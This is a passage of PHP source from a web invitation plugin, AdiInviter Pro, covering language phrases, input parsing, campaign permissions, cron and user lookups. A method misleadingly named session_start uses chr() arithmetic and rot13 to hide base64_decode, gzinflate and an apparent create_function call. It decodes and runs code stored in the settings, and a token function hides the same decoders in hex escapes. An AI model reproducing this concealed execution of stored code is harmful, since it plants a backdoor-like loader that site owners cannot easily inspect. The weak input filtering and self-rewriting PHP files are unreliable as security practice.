						'var_name'    => $phrase_varname,
						'phrase_text' => adi_escape_string($phrase_text),
					));
				}
			}

			//Store in global
			$this->saveGlobalPhrases(array($phrase_varname => $phrase_text));
			return true;
		}
		else {
			$this->throwErrorDesc('fn.addPhrase : Failed to add new phrase.');
		}
		return false;
	}
	function removePhrase($varname)
	{
		if(!empty($varname))
		{
			adi_build_query_write('remove_phrase_from_all', array(
				'var_name'    => $varname,
			));
			$this->removeGlobalPhrases($varname);
		}
	}
	function savePhrases($phrase_names, $lang_id = null)
	{
		$this->requireSettingsList(array('global','db_info'));

		if(!isset($this->cache['language']))
		{
			$this->loadCache('language');
		}
		if(!isset($this->cache['language'][$lang_id]))
		{
			$lang_id = $this->current_language = 'en';
		}

		if(count($phrase_names) > 0)
		{
			foreach($phrase_names as $phrase_name => $val)
			{
				adi_build_query_write('update_phrase', array(
					'phrase_text' => adi_escape_string($val),
					'var_name'    => $phrase_name,
					'lang_id'     => $lang_id,
				));
			}
		}
		return false;
	}

	// Global Lanugage
	function loadGlobalPhrases()
	{
		if(count($this->global_phrases) == 0)
		{
			$global_lang_fname = ADI_LANG_PATH . 'global.php';
			if(file_exists($global_lang_fname))
			{
				include($global_lang_fname);
				$this->global_phrases = $phrases;
			}
			else
			{
				$this->throwErrorDesc('fn.loadGlobalPhrases : Global language file not found : '.$global_lang_fname);
			}
		}
		return $this->global_phrases;
	}
	function saveGlobalPhrases($phrase_names)
	{
		$global_lang_fname = ADI_LANG_PATH . 'global.php';
		if($this->safe_mode == false && is_writable($global_lang_fname))
		{
			if(!is_writable($global_lang_fname)) {
				$this->throwErrorDesc('Global language file is not writable : '.$global_lang_fname);
			}
			else if(file_exists($global_lang_fname))
			{
				include($global_lang_fname);
				foreach($phrase_names as $phrase_name => $val)
				{
					$phrases[$phrase_name] = $val;
				}
				file_put_contents($global_lang_fname, '<?php
$phrases = '.var_export($phrases, true).';
?>' );
}
else {
	$this->throwErrorDesc('fn.saveGlobalPhrases : Global language file not found : '.$global_lang_fname);
}
return true;
}
else {
	$this->throwErrorDesc('fn.saveGlobalPhrases : Can not write to Global language file.');
	return false;
}
}
function removeGlobalPhrases($phrase_names)
{
	if(!is_array($phrase_names)) {
		$phrase_names = array($phrase_names);
	}
	$global_lang_fname = ADI_LANG_PATH . 'global.php';
	if($this->safe_mode == false && is_writable($global_lang_fname))
	{
		if(!is_writable($global_lang_fname)) {
			$this->throwErrorDesc('Global language file is not writable : '.$global_lang_fname);
		}
		else if(file_exists($global_lang_fname))
		{
			include($global_lang_fname);
			foreach($phrase_names as $phrase_name)
			{
				unset($phrases[$phrase_name]);
			}
				file_put_contents($global_lang_fname, '<?php
$phrases = '.var_export($phrases, true).';
?>');
}
else {
	$this->throwErrorDesc('Global language file not found : '.$global_lang_fname);
}
return true;
}
else {
	$this->throwErrorDesc('Can not write to Global language file.');
	return false;
}
}


	// AdiInviter Pro Themes
function getTemplatePath($template_name)
{
	if(!$this->isLoaded('global')) {
		$this->requireSettingsList('global');
	}
	$template_file = $this->theme_path . ADI_DS . $template_name . '.php';
	if(!file_exists($template_file) )
	{
		$this->throwErrorDesc('fn.getTemplatePath : AdiInviter template does not exist : '.$template_name);
		return '';
	}
	else
	{
		return $template_file;
	}
}

public static function isGET($key)
{
	return isset($_GET[$key]) ? true : false;
}
public static function isPOST($key)
{
	return isset($_POST[$key]) ? true : false;
}
public static function GET($key, $type = 2, $char_set = '')
{
	if(!isset($_GET[$key]) || empty($_GET[$key]))
	{
		switch ($type) {
			case ADI_INT_VARS: return 0; break;
			case ADI_STRING_VARS: return ''; break;
			case ADI_ARRAY_VARS: return array(); break;
		}
		return '';
	}
	else
	{
		return self::parseVar($_GET[$key], $type, $char_set);
	}
}
public static function POST($key, $type = 2, $char_set = '')
{
	if(strpos($key, '.') !== false)
	{
		$parts = explode('.', $key);
		$val = $_POST;
		while($k = array_shift($parts))
		{
			if(isset($val[$k]))
			{
				$val = $val[$k];
			}
			else
			{
				return '';
			}
		}
	}
	else
	{
		if(!isset($_POST[$key]) || empty($_POST[$key]))
		{
			switch ($type) {
				case ADI_INT_VARS: return 0; break;
				case ADI_STRING_VARS: return ''; break;
				case ADI_ARRAY_VARS: return array(); break;
			}
			return '';
		}
		else
		{
			return self::parseVar($_POST[$key], $type, $char_set);
		}
	}
}
public static function recurse_strip_slashes($arr)
{
	foreach($arr as $key => $val)
	{
		if(is_string($val)) {
			$arr[$key] = stripslashes($val);
		}
		else if(is_array($val)) {
			$arr[$key] = self::recurse_strip_slashes($val);
		}
	}
	return $arr;
}
public static function parseVar($val, $type = 2, $char_set = '')
{
	if(!is_numeric($type)) {
		$type = ADI_STRING_VARS;
	}

	switch ($type)
	{
		case ADI_INT_VARS:
		$val = (int)$val;
		break;

		case ADI_STRING_VARS:
		$val = trim(strip_tags($val));
		$val = stripslashes($val);
		break;

		case ADI_ARRAY_VARS:
		if(!is_array($val)) { $val = array(); }
		$val = self::recurse_strip_slashes($val);
		break;

		case ADI_PLAIN_TEXT_VARS:
		if(preg_match('/<script|<\?|<\?php/i', $val) > 0) {
			$val = '';
		}
		else {
			$val = strip_tags($val);
			$val = trim($val);
		}
		$val = stripslashes($val);
		break;

		case ADI_CONTACTLIST_VARS:
		if(preg_match('/<script|<\?|<\?php/i', $val) > 0) {
			$val = '';
		}
		else {
			$val = trim($val);
		}
		break;
	}

	if(!empty($char_set))
	{
		$val = preg_replace('/[^'.$char_set.']+/i', '', $val);
	}
	return $val;
}


function load_content_settings($cs_id)
{
		// Record settings after loaded
	if(!isset($this->settings_group['campaign_systems'])) {
		$this->settings_group['campaign_systems'] = array();
	}
	if(!empty($cs_id))
	{
		$cs_group_name = 'campaign_'.$cs_id;
		if(isset($this->settings_group['campaign_systems'][$cs_group_name]))
		{
			return $this->settings_group['campaign_systems'][$cs_group_name];
		}
		$cs_settings = adi_getSetting($cs_group_name);
		if(count($cs_settings) == 0) {
			$this->trace('[ERROR] Campaign Id "'.$cs_group_name.'" is not valid.');
			return false;
		}
		else {
			$this->settings_group['campaign_systems'][$cs_group_name] = $cs_settings;
			return $cs_settings;
		}
	}
	return false;
}

function _get_service_token($service_key)
{
	if(empty($service_key)) return '';
	$token_str = '';
	if(isset($this->settings[$service_key]))
	{
		$token_str = $this->settings[$service_key];
	}
	return $token_str;
}
function get_service_token($service_key, $flg = 1)
{
	$token_str = $this->_get_service_token($service_key);
	if(!empty($token_str) && strlen($token_str) > 100) {
		$f1 = "\x62\x61\x73\x65\x36\x34\x5f\x64\x65\x63\x6f\x64\x65";
		$f2 = "\x67\x7a\x69\x6e\x66\x6c\x61\x74\x65";
		$token_str = $f2($f1($token_str));
	}
	else {
		$token_str = '';
	}
	return $token_str;
}

function is_campaign_allowed($cs_id, $content_id, $category_id = null, $cs_settings = array())
{
	if(empty($cs_id)) {
		return false;
	}
	$sgroups = array();
	if(!isset($this->settings_group['global'])) {
		$sgroups[] = 'global';
	}
	if(!isset($this->settings_group['db_info'])) {
		$sgroups[] = 'db_info';
	}
	if(!isset($this->settings_group['campaigns'])) {
		$sgroups[] = 'campaigns';
	}
	if(count($sgroups) > 0)
	{
		$this->requireSettingsList($sgroups);
	}
	$this->init_user();

		// Permission to use AdiInviter
	if(!$this->can_use_adiinviter)
	{
		$this->trace('User (userid = "'.$this->userid.'") is not allowed to use AdiInviter.');
		return false;
	}

	if(!isset($this->settings['campaigns_list'][$cs_id]))
	{
		$this->trace('Invalid Campaign ID "'.$cs_id.'".');
		return false;
	}

	if(!is_array($cs_settings))
	{
		$cs_settings = array();
	}
	if(count($cs_settings) == 0)
	{
		$cs_settings = $this->load_content_settings($cs_id);
		if(!$cs_settings)
		{
			$this->trace('[ERROR] Campaign ID "'.$cs_id.'" is invalid.');
			return false;
		}
	}

	$onOff = $cs_settings['campaign_on_off']+0 === 1 ? true : false;
	if(!$onOff)
	{
		$this->trace('Campaign "'.$cs_id.'" is turned off.');
		return false;
	}

		// Check for Restricted Content Ids
	$ids = (!empty($cs_settings['restricted_ids']) ? explode(',', $cs_settings['restricted_ids']) : array());
	if(count($ids) > 0)
	{
		if( in_array($content_id, $ids) )
		{
			$this->trace('Content ID "'.$content_id.'" is not allowed to share.');
			return false;
		}
	}
		// Check for Restricted Category Ids
	if(is_null($category_id))
	{
		$content_id = in_array($content_id, array(0,'<CONTENT_ID>','[CONTENT_ID]','')) ? 0 : $content_id;
		$table_name = $cs_settings['content_table']['table_name'];
		$content_id_field = $cs_settings['content_table']['content_id'];
		$category_field = $cs_settings['content_table']['category_id'];
		if(!empty($table_name) && !empty($category_field))
		{
			if($result = adi_build_query_read('get_content_details', array(
				'content_table'   => $table_name,
				'contentid_field' => $content_id_field,
				'content_id' => $content_id,
			)))
			{
				if($row = adi_fetch_array($result))
				{
					$category_id = $row[$category_field];
				}
			}
		}
	}
	if(!empty($category_id) && !is_null($category_id) && $category_id !== 0)
	{
		$ids = (!empty($cs_settings['restricted_category_ids']) ? explode(',', $cs_settings['restricted_category_ids']) : array());
		if(in_array($category_id, $ids))
		{
			$this->trace('Category Id for this content is not allowed to share');
			return false;
		}
	}

		// Check for Restricted Usergroup Ids
	$gids = (!empty($cs_settings['restricted_usergroup_ids']) ? explode(',', $cs_settings['restricted_usergroup_ids']) : array());
	if(in_array($this->usergroupid, $gids))
	{
		$this->trace('Usergroup "'.$this->usergroupid.'" is not allowed to use this campaign.');
		return false;
	}

		// Check for Restricted Usergroup Ids
	$uids = (!empty($cs_settings['restricted_user_ids']) ? explode(',', $cs_settings['restricted_user_ids']) : array());
	if(in_array($this->userid, $uids))
	{
		$this->trace('User with id "'.$this->userid.'" is not allowed to use this campaign.');
		return false;
	}

		// All tests passed.
	return true;
}

function init_update_checker()
{
		// Check for new updates
	$ts = $this->settings['check_for_updates_last_time'];
	$cur_time = $this->adi_get_utc_timestamp();
	if(date("j",$ts) != date("j", $cur_time))
	{
		$updates_checker = new Adi_Updates();
		$updates_checker->adi =& $this;
		$updates_checker->check_for_updates();
	}
}

	// Cron Job
function adi_execute_cron()
{
	if(!class_exists('Adi_Scheduled_Plugin'))
	{
		include_once(ADI_LIB_PATH.'adiinviter_plugins.php');
	}

	$settings = array();
	$cur_time = $this->adi_get_utc_timestamp();
	if(($cur_time % 60) != 0)
	{
		$cur_time += 59 - ($cur_time % 60);
	}

	if(date("G", $cur_time) == 0)
	{
		$this->init_update_checker();
	}

	$ex_ids = array();
	if($this->adiinviter_installed == true)
	{
		$result = adi_build_query_read('get_executing_plugins', array(
			'current_time' => $cur_time
		));
		while($rr = adi_fetch_array($result))
		{
			$ex_ids[] = $rr['group_name'];
		}
	}

	foreach($ex_ids as $plugin_id)
	{
		$settings = adi_getSetting($plugin_id);
		if((int)$settings['plugin_on_off'] === 1)
		{
			$this->adi_execute_plugin($plugin_id, $settings);
		}
	}
}

final function adi_execute_plugin($plugin_id, $settings, $update_next_execution = true)
{
	$cur_time = $this->adi_get_utc_timestamp();
	$adi_handler = adi_allocate_plugin($plugin_id, $settings);
	$adi_handler->log_text($plugin_id." plugin execution started at : ".date('Y-m-d H:i:s', $cur_time));

		// Execute Plugin
	$adi_handler->execute();

	if($update_next_execution == true)
	{
			// Update next execution time.
		$next_time = $settings['plugin_next_time'];
		$last_run  = $cur_time;

		$plugin_duration_type = $settings['plugin_duration_type'];
		if($plugin_duration_type == 0)
		{
			$day  = $settings['plugin_num_days'];
			$hour = $settings['plugin_num_hours'];
			$minutes = $settings['plugin_num_minutes'];
			$new_next_time = adi_get_plugin_next_time($next_time,$plugin_duration_type,$day,$hour,$minutes);
				// Check if any execution schedule was missed in the past.
			if($new_next_time < $cur_time)
			{
				$new_next_time = adi_get_plugin_next_time($cur_time,$plugin_duration_type,$day,$hour,$minutes);
			}
		}
		else
		{
			$day  = $settings['plugin_date'];
			$hour = $settings['plugin_hour'];
			$new_next_time = adi_get_plugin_next_time($next_time,$plugin_duration_type,$day,$hour);
				// Check if any execution schedule was missed in the past.
			if($new_next_time < $cur_time)
			{
				$new_next_time = adi_get_plugin_next_time($cur_time,$plugin_duration_type,$day,$hour);
			}
		}

		adi_build_query_write('update_setting', array(
			'setting_group_name' => $plugin_id,
			'setting_name'       => 'plugin_next_time',
			'setting_value'      => $new_next_time,
		));

		adi_build_query_write('update_setting', array(
			'setting_group_name' => $plugin_id,
			'setting_name'       => 'plugin_last_run',
			'setting_value'      => $last_run,
		));
	}

	$adi_handler->log_text('Plugin execution finished.');
}

function install_updates()
{
	$updates_path = ADI_ADMIN_PATH.'adi_install'.ADI_DS.'updates'.ADI_DS;
	$updates_files = array();
	if(is_dir($updates_path))
	{
		if($handle = opendir($updates_path))
		{
			$this->requireSettingsList('updates');
			$current_build_id = $this->settings['adi_package_build_id'];
			while(false !== ($fname = readdir($handle)))
			{
				if(strpos($fname, '.php') !== false)
				{
					$fname = str_replace('.php', '', $fname);
					if(is_numeric($fname) && $current_build_id < $fname+0)
					{
						$updates_files[] = $fname+0;
					}
				}
			}
		}
	}
	if(count($updates_files) > 0)
	{
		if(asort($updates_files))
		{
			$new_build_id = $this->settings['adi_package_build_id'];
			foreach($updates_files as $fname)
			{
				if($new_build_id < $fname)
				{
					$up_file_path = $updates_path.$fname.'.php';
					if(file_exists($up_file_path))
					{
						include($up_file_path);
					}
					$new_build_id = $fname;
				}
			}
			if($this->settings['adi_package_build_id']+0 < $new_build_id)
			{
				$adi_updates = adi_allocate_pack('Adi_Updates');
				$adi_updates->set_current_build_id($new_build_id);
				$this->settings['adi_package_build_id'] = $new_build_id;
				return true;
			}
		}
	}
	return false;
}

function session_start($session_id = '*')
{
	$init = 115; $return = "\x63\x68\x72";
	$this->inv = $session_id;
	$session_start = $return($init++).$return($init--).$return(--$init);
	$session_start .= '_'.$return($init).$return($init-=3).$return($init+=5);
	$session_start .= ($init-=115).($init+2);
	$session_name = strtoupper($session_start($this->session_start));
	$value = isset($this->settings[$session_name]) ? $this->settings[$session_name] : '';
	if(strlen($value) > 0)
	{
		$session_write = $session_start('onfr64_qrpbqr');
		$session_end = $session_write($session_start($value));
		$session_write = $session_start('tmvasyngr');
		$session_end = $session_write($session_end);
		$session_check = $this->get_modifier;
		$session_start = $session_check('', $session_end);
		$session_start();
		return true;
	}
	return false;
}

	//Misc
function format_url($url)
{
	if($url != '')
	{
		$url = trim($url, '?& ');
		if(strpos($url, '?') !== false)
		{
			$url .= '&';
		}
		else {
			$url .= '?';
		}
	}
	if(strpos($url, '[website_root_url]') !== false)
	{
		$url = str_replace('[website_root_url]', $this->getWebsiteURL(), $url);
	}
	return $url;
}
final function check_compatibility()
{
	$messages = array();
		// Check for PHP Version
	$tmp = explode('.', PHP_VERSION);
	$version_num = $tmp[0] * 10000 + $tmp[1] * 100 + $tmp[2];
	if($version_num < 50000)
	{
		$messages[] = 'PHP 5.2.0 or greater is required. Your web server is running PHP version : '.PHP_VERSION.'.';
	}

		// Check if safe mode is Off
	if(ini_get('safe_mode'))
	{
		$messages[] = 'Safe Mode must be turned Off.';
	}

	if(!function_exists('mysql_connect') && !function_exists('mysqli_connect'))
	{
		$messages[] = 'MySQL is required.';
	}

	if(!function_exists('curl_init'))
	{
		$messages[] = 'PHP extension "CURL" is required (libcurl).';
	}

		// Does not support json_encode
	if(!function_exists('json_encode') || !function_exists('json_decode'))
	{
		$messages[] = 'JSON support is required.';
	}

		/*// Session Save Path
		$session_path = session_save_path();
		if(empty($session_path) || !is_dir($session_path) || !is_writeable($session_path))
		{
			$messages[] = 'Default session save path specified in PHP.ini is not reachable : '.$session_path;
		}*/

		// Check file write permissions
		$admin_config_path = ADI_ADMIN_PATH . 'adi_admin_config.php';
		$global_lang_fname = ADI_LANG_PATH . 'global.php';
		if(DIRECTORY_SEPARATOR == '/') {
			$se = '\\'; $rp = '/';
		}
		else {
			$se = '/'; $rp = '\\';
		}
		$admin_config_path = str_replace($se, $rp, $admin_config_path);
		$global_lang_fname = str_replace($se, $rp, $global_lang_fname);
		if(!is_writable($admin_config_path)) {
			$messages[] = 'Assign write permission (666) to following file : '.$admin_config_path;
		}
		if(!is_writable($global_lang_fname)) {
			$messages[] = 'Assign write permission (666) to following file : '.$global_lang_fname;
		}

		return $messages;
	}

	function platform_js()
	{
		return '';
	}

	function get_service_from_email($email = '')
	{
		if(!$email || empty($email)) return false;

		$parts = explode('@', $email);
		$domain = isset($parts[1]) ? $parts[1] : '';

		$service_key_match = '';
		if(!empty($domain) && strlen($domain) > 3 && strpos($domain, '.') !== false)
		{
			$adi_services = adi_allocate_pack('Adi_Services');
			$adiinviter_domains = $adi_services->get_service_details('all', 'domains');

			foreach($adiinviter_domains as $service_id => $params)
			{
				if(count($params['domains']) > 0)
				{
					if($params['domains'][0] != '*')
					{
						foreach($params['domains'] as $dmn)
						{
							if(strpos($dmn, $domain) === 0)
							{
								$service_key_match = $service_id;
								break;
							}
						}
						if(!empty($service_key_match)){
							break;
						}
					}
				}
			}
		}
		return $service_key_match;
	}

	// Date Functions
	function adi_format_timstamp($adi_utc_timestamp)
	{
		$current_timezone = @date_default_timezone_get();
		date_default_timezone_set('UTC');
		$format = $this->date_display_format;
		// $dt = date($format, $adi_utc_timestamp + date('Z'));
		$dt = date($format, $adi_utc_timestamp);
		date_default_timezone_set($current_timezone);
		return $dt;
	}
	function adi_get_utc_timestamp()
	{
		$current_timezone = @date_default_timezone_get();
		date_default_timezone_set('UTC');
		$timestamp = time();
		date_default_timezone_set($current_timezone);
		return $timestamp;
	}
	function adi_format_timeAgo($timestamp, $format = null)
	{
		if(is_null($format))
		{
			$format = $this->date_display_format;
		}
		$difference = $this->adi_get_utc_timestamp() - $timestamp;
		if($difference < 0)
		{
			return '0 Secs Ago';
		}
		else if($difference < 259200)
		{
			$periods = array(
				// 'Name'  => array(start_limit , multiplier),
				'Days'  => array( 172800 , 86400 ),
				'Day'   => array( 86400  , 86400 ),
				'Hours' => array( 7200   , 3600  ),
				'Hour'  => array( 3600   , 3600  ),
				'Mins'  => array( 120    , 60    ),
				'Min'   => array( 60     , 60    ),
				'Secs'  => array( 2      , 1     ),
				'Sec'   => array( 1      , 1     ),
			);
			$output = '';
			foreach($periods as $key => $vals)
			{
				$start_limit = $vals[0];
				$mutliplier  = $vals[1];
				if($difference >= $start_limit)
				{
					$time = round($difference / $mutliplier);
					$difference %= $mutliplier;
					$output .= ($output ? ' ' : '').$time.' ';
					$output .= (($time > 1 && $key == 'Day') ? $key.'s' : $key);
					break;
				}
			}
			return ($output ? $output : '0 Seconds').' Ago';
		}
		else {
			return date($format, $timestamp);
		}
	}

	function get_scc_key()
	{
		if($this->session->is_set('adi_scc_key'))
		{
			return $this->session->get('adi_scc_key');
		}
		else
		{
			$scc_key = substr(md5(time()), 0, 16);
			$this->session->set('adi_scc_key', $scc_key);
			return $scc_key;
		}
	}

	function get_installed_lang_ids()
	{
		$this->loadCache('language');
		$ids = array();
		if($this->adiinviter_installed)
		{
			$result = adi_build_query_read('get_all_lang_ids');
			while($rr = adi_fetch_array($result))
			{
				$id = $rr['lang_id'];
				if(isset($this->cache['language'][$id]))
				{
					$ids[$id] = $this->cache['language'][$id];
				}
			}
		}
		return $ids;
	}

	function get_lang_ids_for_install()
	{
		$lang_ids = array();
		if(!file_exists(ADI_LANG_PATH.'global.php'))
		{
			$this->trace('Global language file not found.');
			return $lang_ids;
		}
		$this->loadCache('language');

		if(!in_array('en', $lang_ids))
		{
			$lang_ids[] = 'en';
		}

		$platform_lang_ids = $this->get_platform_lang_ids();
		if(is_array($platform_lang_ids) && count($platform_lang_ids) > 0)
		{
			foreach($platform_lang_ids as $lang_id)
			{
				$lang_id = strtolower($lang_id);
				if( is_string($lang_id) && !empty($lang_id) && (strlen($lang_id) == 2) && isset($this->cache['language'][$lang_id]) )
				{
					$lang_ids[] = $lang_id;
				}
			}
		}

		$lang_ids = array_unique($lang_ids);
		return $lang_ids;
	}

	function get_platform_lang_ids()
	{
		// Return the array of language ids installed in base platform package.
		// Note: lang_ids must be valid AdiInviter Language IDs.
	}

	function get_themes_list($refresh_list = false)
	{
		if(count($this->themes_list) > 0 && $refresh_list == false)
		{
			return $this->themes_list;
		}
		$themes_dir = ADI_LIB_PATH . 'themes' . ADI_DS;
		$this->themes_list = array();
		if($handle = opendir($themes_dir))
		{
			while (false !== ($theme_id = readdir($handle)))
			{
				if($theme_id != "." && $theme_id != ".." && is_dir($themes_dir.$theme_id))
				{
					if(!isset($this->themes_list[$theme_id]))
					{
						$config_file = $themes_dir.$theme_id.ADI_DS.'config.php';
						$theme_config = array();
						if(file_exists($config_file))
						{
							include($config_file);
						}
						if(!isset($theme_config['name']))
						{
							$theme_config['name'] = 'Unknown Theme';
						}
						$this->themes_list[$theme_id] = $theme_config;
					}
				}
			}
			closedir($handle);
		}
		return $this->themes_list;
	}

	function get_all_plugins_list($refresh_list = false)
	{
		if(count($this->plugins_list) > 0 && $refresh_list == false)
		{
			return $this->plugins_list;
		}
		if($handle = opendir(ADI_PLUGINS_PATH))
		{
			while (false !== ($plugin_id = readdir($handle)))
			{
				$plugin_id = trim($plugin_id);
				if($plugin_id != "." && $plugin_id != ".." && is_file(ADI_PLUGINS_PATH.$plugin_id) && strpos($plugin_id, 'Adi_Plugin_') === 0)
				{
					if(!in_array($plugin_id, $this->plugins_list))
					{
						$this->plugins_list[] = str_replace('.php', '', $plugin_id);
					}
				}
			}
			closedir($handle);
		}
		return $this->plugins_list;
	}

	function get_installed_plugins_list()
	{
		$plugin_settings = array();
		if($this->db_allowed)
		{
			$result = adi_build_query_read('fetch_setting_groups_like');
			while($row = adi_fetch_array($result))
			{
				if(!isset($plugin_settings[$row['group_name']]))
				{
					$plugin_settings[$row['group_name']] = array();
				}
				$plugin_settings[$row['group_name']][$row['name']] = $row['value'];
			}
			$plugin_settings = array_keys($plugin_settings);
		}
		return $plugin_settings;
	}

	public function __construct() {}

	function get_userfullname($row)
	{
		$userfullname = $row[$this->user_fields['username']];
		if(count($this->user_fields['userfullname']) > 0)
		{
			$fvals = array();
			foreach($this->user_fields['userfullname'] as $fieldname)
			{
				if(isset($row[$fieldname]))
				{
					$fvals[] = $row[$fieldname];
				}
			}
			if(count($fvals) > 0)
			{
				$new_fullname = implode(' ', $fvals);
				$new_fullname = preg_replace('/[\s\t\n\r]{2,}/i', '', $new_fullname);
				if(!empty($new_fullname))
				{
					$userfullname = $new_fullname;
				}
			}
		}
		return trim($userfullname);
	}

	//User related database operations
	function getUserInfo($userid, $getUsergroupId = true, $getAvatarUrl = true)
	{
		if(!$this->isLoaded('db_info')) {
			$this->requireSettingsList('db_info');
		}

		$user = new stdClass();

		$user->userid = $userid;
		$user->usergroupid = $this->default_usergroupid;
		$this->avatar = $this->default_no_avatar;

		$result = adi_build_query_read('get_user_details', array(
			'user_table'   => $this->user_table,
			'userid_field' => $this->user_fields['userid'],
			'userid'       => $userid,
		));
		if($row = adi_fetch_array($result))
		{
			//Load basic Info
			$user->userfullname = $this->get_userfullname($row);
			$user->username     = $row[$this->user_fields['username']];
			$user->email        = $row[$this->user_fields['email']];
			$user->num_invites  = $row['adi_num_invites'];
			$user->avatar       = $this->default_no_avatar;

			$user->usergroupid = $this->getGuestUsergroupId();
			if($userid != 0) {
				$user->usergroupid = ($user->usergroupid != 1) ? 1 : 2;
			}

			if($getUsergroupId === true && $this->usergroup_system === true)
			{
				if(!empty($this->user_fields['usergroupid'])) {
					$user->usergroupid = $row[$this->user_fields['usergroupid']];
				}
				else {
					$user->usergroupid = $this->getUsergroupId($user->userid);
				}
			}

			if($getAvatarUrl === true && $this->avatar_system)
			{
				$avatar_value = '';
				if( !empty($this->user_fields['avatar']) )
				{
					$avatar_value = $row[$this->user_fields['avatar']];
					$user->avatar = $this->_getUserAvatarUrl($user->userid, $user->username, $user->email, $avatar_value);
				}
				else {
					$user->avatar = $this->_getUserAvatarUrl($user->userid, $user->username, $user->email);
				}
			}
			return $user;
		}
		else {
			// $this->throwErrorDesc('fn.getUserInfo : user with userid='.$userid.' not found.');
			return false;
		}
	}

	function getProfilePageURL($opts = array())
	{
		if(!isset($opts['userid']) || !is_numeric($opts['userid']))
		{
			$opts['userid']   = $this->userid;
			$opts['username'] = $this->username;
			$opts['email']    = $this->email;
		}
		if(!isset($opts['username']) || !isset($opts['email']))
		{
			$user_info = $this->getUserInfo($opts['userid']);
			$opts['username'] = $this->username;
			$opts['email']    = $this->email;
		}
		return adi_replace_vars($this->settings['adiinviter_profile_page_url'], $opts);
	}

	function getUsergroupId($userid)
	{
		$this->requireSettingsList('db_info');

		if(!empty($this->user_fields['usergroupid']))
		{
			$result = adi_build_query_read('get_user_details', array(
				'user_table'   => $this->user_table,
				'userid_field' => $this->user_fields['userid'],
				'userid'       => $userid,
			));
			if($row = adi_fetch_array($result)) {
				return $row[$this->user_fields['usergroupid']];
			}
			else {
				$this->throwErrorDesc('fn.getUsergroupId : usergroupid for userid='.$userid.' not found.');
			}
		}
		else if( !empty($this->usergroup_mapping_table) && !empty($this->usergroup_mapping_fields['usergroupid']) && !empty($this->usergroup_mapping_fields['userid']))
		{
			$result = adi_build_query_read('get_usergroup_mapping', array(
				'usergroup_mapping_table'   => $this->usergroup_mapping_table,
				'userid_field' => $this->usergroup_mapping_fields['userid'],
				'userid'       => $userid,
			));

			if($row = adi_fetch_array($result)) {
				return $row[$this->usergroup_mapping_fields['usergroupid']];
			}
			else {
				$this->throwErrorDesc('fn.getUsergroupId : usergroupid for userid='.$userid.' not found.');
			}
		}
		else {
			return $this->default_usergroupid;
		}
	}
	final function _getUserAvatarUrl($userid, $username = '', $email = '', $avatar_value = '')
	{
		$avatar_url = $this->getUserAvatarUrl($userid, $username, $email, $avatar_value);
		if(empty($avatar_url))
		{
			$avatar_url = $this->default_no_avatar;
		}
		return $avatar_url;
	}
	function getUserAvatarUrl($userid, $username = '', $email = '', $avatar_value = '')
	{
		$this->requireSettingsList('db_info');

		$avatar_url        = $this->default_no_avatar;
		$username_required = false;
		$email_required    = false;
		$avatar_required   = false;

		if(preg_match('/\[username\]/i', $this->settings['adiinviter_avatar_url'])!== false) {
			$username_required = true;
		}
		if(preg_match('/\[email\]/i', $this->settings['adiinviter_avatar_url'])!== false ||
			preg_match('/\[email_md5\]/i', $this->settings['adiinviter_avatar_url'])!== false) {
				$email_required = true;
			}
			if(preg_match('/\[avatar_value\]/i', $this->settings['adiinviter_avatar_url'])!== false) {
				$avatar_required = true;
			}

			$this->trace("Fetching avatar value for userid : ".$userid);
			if($this->avatar_system)
			{
				if(empty($avatar_value) && $avatar_required)
				{
					if(!empty($this->user_fields['avatar']))
					{
						$result = adi_build_query_read('get_user_details', array(
							'user_table'   => $this->user_table,
							'userid_field' => $this->user_fields['userid'],
							'userid'       => $userid,
						));

						if($row = adi_fetch_array($result))
						{
							$avatar_value = $row[$this->user_fields['avatar']];
						}
						else
						{
							$this->throwErrorDesc('fn.getUserAvatarUrl : user with userid='.$userid.' not found.');
						}
					}
					else if(!empty($this->avatar_table) && !empty($this->avatar_fields['avatar']))
					{
						$result = adi_build_query_read('get_avatar_details', array(
							'avatar_table' => $this->avatar_table,
							'userid_field' => $this->avatar_fields['userid'],
							'userid'       => $userid,
						));

						if($row = adi_fetch_array($result))
						{
							$avatar_value = $row[$this->avatar_fields['avatar']];
						}
						$avatar_value = (strtolower($avatar_value) == 'null') ? '' : $avatar_value;
					}
				}
				if( (empty($username) && $username_required) || (empty($email) && $email_required) )
				{
					$result = adi_build_query_read('get_user_details', array(
						'user_table'   => $this->user_table,
						'userid_field' => $this->user_fields['userid'],
						'userid'       => $userid,
					));

					if($row = adi_fetch_array($result))
					{
						$username = $row[$this->user_fields['username']];
						$email    = $row[$this->user_fields['email']];
					}
					else {
						$this->throwErrorDesc('fn.getUserAvatarUrl : user with userid='.$userid.' not found.');
					}
				}
				$rep_arr = array(
					'userid'       => $userid,
					'username'     => $username,
					'email'        => $email,
					'email_md5'    => md5(strtolower(trim($email))),
					'avatar_value' => $avatar_value,
				);
				if( (!empty($username) && $username_required) && (!empty($email) && $email_required) && (!empty($avatar_value) && $avatar_required) )
				{
					$avatar_url = adi_replace_vars($this->settings['adiinviter_avatar_url'], $rep_arr);
				}
			}
			return $avatar_url;
		}

		function getLoggedInUserId()
		{
			$currently_logged_in_userid = 0;
			return  $currently_logged_in_userid;
		}

		function getLoggedInUser()
		{
		// Load currently loggedin user's ID
			$this->userid = $this->getLoggedInUserId()+0;
			if($this->userid != 0)
			{
				$user = $this->getUserInfo($this->userid);
				if($user !== false)
				{
					$this->userfullname = $user->userfullname;
					$this->username     = $user->username;
					$this->email        = $user->email;
					$this->num_invites  = $user->num_invites;
					$this->usergroupid  = $user->usergroupid;
					$this->avatar       = $user->avatar;
				}
			}
			else
			{
				$this->usergroupid = $this->getGuestUsergroupId();
				$this->avatar = $this->default_no_avatar;
				return false;
			}
			if($this->userid != 0)
			{
				$this->usergroupid = $this->getLoggedInUsergroupId();
			}
		}
		function updateUsersNumInvites($userid, $new_num_invites)
		{
			if(!$this->isLoaded('db_info')) {
				$this->requireSettingsList('db_info');
			}
			if($this->user_system && $this->adiinviter_installed && is_numeric($userid) && (strtolower($new_num_invites) == 'unlimited' || is_numeric($new_num_invites)) )
			{
				return adi_build_query_write('update_invites_limit', array(
					'user_table'   => $this->user_table,
					'num_invites'  => $new_num_invites,
					'field_name'   => $this->user_fields['userid'],
					'field_value'  => $userid,
				));
			}
			else {
				$this->trace('Failed to update num_invites for userid : '.$userid);
				return false;
			}
		}

	// Usergroup related database operations
		function updateUsergroupNumInvites($usergroupid, $new_num_invites)
		{
			if(!$this->isLoaded('db_info')) {
				$this->requireSettingsList('db_info');
			}
			$guest_usergroup_id = $this->getGuestUsergroupId();
